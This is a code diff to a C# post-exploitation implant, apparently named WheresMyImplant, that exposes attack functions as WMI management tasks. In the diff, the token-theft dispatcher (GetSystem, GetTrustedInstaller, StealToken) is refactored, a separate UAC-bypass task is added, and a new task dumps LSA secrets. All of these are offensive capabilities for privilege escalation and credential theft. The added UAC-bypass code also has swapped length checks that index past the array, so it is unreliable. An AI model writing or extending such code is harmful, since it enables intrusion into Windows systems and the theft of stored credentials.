@@ -332,7 +332,7 @@ namespace WheresMyImplant
         }
 
         [ManagementTask]
-        public static string Tokenvator(string command)
+        public static String Tokenvator(string command)
         {
             Tokens tokenvator = new Tokens();
             if (command.ToLower().Contains("getsystem"))
@@ -340,11 +340,12 @@ namespace WheresMyImplant
                 String[] split = command.Split(' ');
                 if (split.Length >= 2)
                 {
-                    new Tokens().GetSystem(split[1]);
+                    tokenvator.GetSystem(split[1]);
                 }
                 else
                 {
-                    new Tokens().GetSystem("cmd.exe");
+                    tokenvator = new Tokens();
+                    tokenvator.GetSystem("cmd.exe");
                 }
             }
             else if (command.ToLower().Contains("gettrustedinstaller"))
@@ -352,11 +353,11 @@ namespace WheresMyImplant
                 String[] split = command.Split(' ');
                 if (split.Length >= 2)
                 {
-                    new Tokens().GetTrustedInstaller(split[1]);
+                    tokenvator.GetTrustedInstaller(split[1]);
                 }
                 else
                 {
-                    new Tokens().GetTrustedInstaller("cmd.exe");
+                    tokenvator.GetTrustedInstaller("cmd.exe");
                 }
             }
             else if (command.ToLower().Contains("stealtoken"))
@@ -364,34 +365,52 @@ namespace WheresMyImplant
                 String[] split = command.Split(' ');
                 if (split.Length >= 3)
                 {
-                    new Tokens().StartProcessAsUser(Int32.Parse(split[1]), split[2]);
+                    tokenvator.StartProcessAsUser(Int32.Parse(split[1]), split[2]);
                 }
                 else
                 {
-                    new Tokens().StartProcessAsUser(Int32.Parse(split[1]), "cmd.exe");
-                }
-            }
-            else if (command.ToLower().Contains("bypassuac"))
-            {
-                String[] split = command.Split(' ');
-                if (split.Length >= 3)
-                {
-                    new RestrictedToken().BypassUAC(Int32.Parse(split[1]), split[2]);
-                }
-                else
-                {
-                    new RestrictedToken().BypassUAC(Int32.Parse(split[1]), "cmd.exe");
+                    tokenvator.StartProcessAsUser(Int32.Parse(split[1]), "cmd.exe");
                 }
             }
             else
             {
-                Console.WriteLine("Invalid Options");
-                Console.WriteLine("GetSystem            <new_process>");
-                Console.WriteLine("GetTrustedInstaller  <new_process>");
-                Console.WriteLine("StealToken           <process_id> <new_process>");
-                Console.WriteLine("BypassUAC            <process_id> <new_process>");
+                tokenvator = new Tokens();
+                tokenvator.GetHelp();
             }
             return tokenvator.GetOutput();
+        }
+
+        [ManagementTask]
+        public static String BypassUac(string command)
+        {
+            RestrictedToken tokenvator = new RestrictedToken();
+            String[] split = command.Split(' ');
+            if (split.Length == 2)
+            {
+                tokenvator.BypassUAC(Int32.Parse(split[1]), split[2]);
+            }
+            else if (split.Length == 3)
+            {
+                tokenvator = new RestrictedToken();
+                tokenvator.BypassUAC(Int32.Parse(split[1]), "cmd.exe");
+            }
+            else
+            {
+                tokenvator = new RestrictedToken();
+                tokenvator.GetHelp();
+            }
+            return tokenvator.GetOutput();
+        }
+
+        [ManagementTask]
+        public static String DumpLsa()
+        {
+            LSASecrets lsaSecrets = new LSASecrets();
+            if (!lsaSecrets.bailOut)
+            {
+                lsaSecrets.DumpLSASecrets();
+            }
+            return lsaSecrets.GetOutput();
         }
     }
 }
